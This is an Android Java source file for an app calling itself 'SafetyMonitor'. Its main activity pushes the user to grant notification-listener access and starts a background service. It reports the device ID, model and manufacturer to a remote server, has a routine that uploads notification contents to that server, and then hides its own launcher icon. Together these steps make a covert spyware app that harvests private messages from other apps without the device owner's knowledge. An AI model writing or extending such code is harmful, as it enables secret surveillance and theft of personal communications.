package com.safety.monitor;

import android.content.ComponentName;
import android.content.Intent;
import android.content.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.safety.monitor.config.AppConfig;
import com.safety.monitor.service.BackgroundService;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "SafetyMonitor";
    private static String deviceId;
    private TextView statusText;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        statusText = findViewById(R.id.statusText);
        Button testButton = findViewById(R.id.testButton);
        
        if (testButton != null) {
            testButton.setOnClickListener(v -> testServerConnection());
        }
        
        // Check for notification access permission
        if (!isNotificationServiceEnabled()) {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
            updateStatus("Please grant notification access");
        } else {
            updateStatus("Notification access granted");
            // Start background service
            Intent serviceIntent = new Intent(this, BackgroundService.class);
            startService(serviceIntent);
            Log.d(TAG, "Background service started");
        }
        
        // Generate or get unique device ID
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        
        // Log installation/startup
        sendInstallationStatus(true);
        
        // Hide app icon after installation
        hideAppIcon();
        
        finish(); // Close activity
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Update status when returning to the app
        if (isNotificationServiceEnabled()) {
            updateStatus("Notification access granted");
        } else {
            updateStatus("Notification access required");
        }
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && TextUtils.equals(pkgName, cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void updateStatus(String message) {
        if (statusText != null) {
            runOnUiThread(() -> statusText.setText(message));
        }
    }

    private void testServerConnection() {
        updateStatus("Testing server connection...");
        new Thread(() -> {
            try {
                URL url = new URL(AppConfig.SERVER_URL + "/api/notifications");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String testData = "{\"packageName\":\"test\",\"appName\":\"Test App\",\"title\":\"Test Notification\",\"text\":\"Hello Server\",\"timestamp\":" + System.currentTimeMillis() + ",\"source\":\"test\"}";
                try(OutputStream os = conn.getOutputStream()) {
                    os.write(testData.getBytes());
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Response Code: " + responseCode);
                
                if (responseCode >= 200 && responseCode < 300) {
                    updateStatus("Server connection successful!");
                } else {
                    updateStatus("Server error: " + responseCode);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error: " + e.getMessage());
                updateStatus("Connection failed: " + e.getMessage());
            }
        }).start();
    }

    private void sendNotification(NotificationData notification) {
        new Thread(() -> {
            try {
                URL url = new URL(AppConfig.SERVER_URL + "/api/notifications");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                // Convert notification to JSON
                String jsonData = notification.toJson();
                Log.d(TAG, "Sending notification: " + jsonData);

                try(OutputStream os = conn.getOutputStream()) {
                    os.write(jsonData.getBytes());
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Server Response Code: " + responseCode);
                
                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, "Notification sent successfully");
                } else {
                    Log.e(TAG, "Server error: " + responseCode);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error sending notification: " + e.getMessage());
            }
        }).start();
    }

    private void sendInstallationStatus(boolean isActive) {
        new Thread(() -> {
            try {
                URL url = new URL(AppConfig.SERVER_URL + "/api/device-status");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject data = new JSONObject();
                data.put("deviceId", deviceId);
                data.put("status", isActive ? "active" : "inactive");
                data.put("model", Build.MODEL);
                data.put("manufacturer", Build.MANUFACTURER);
                data.put("installedAt", System.currentTimeMillis());

                try(OutputStream os = conn.getOutputStream()) {
                    os.write(data.toString().getBytes());
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Installation status sent. Response: " + responseCode);
            } catch (Exception e) {
                Log.e(TAG, "Error sending installation status: " + e.getMessage());
            }
        }).start();
    }

    private void hideAppIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }
}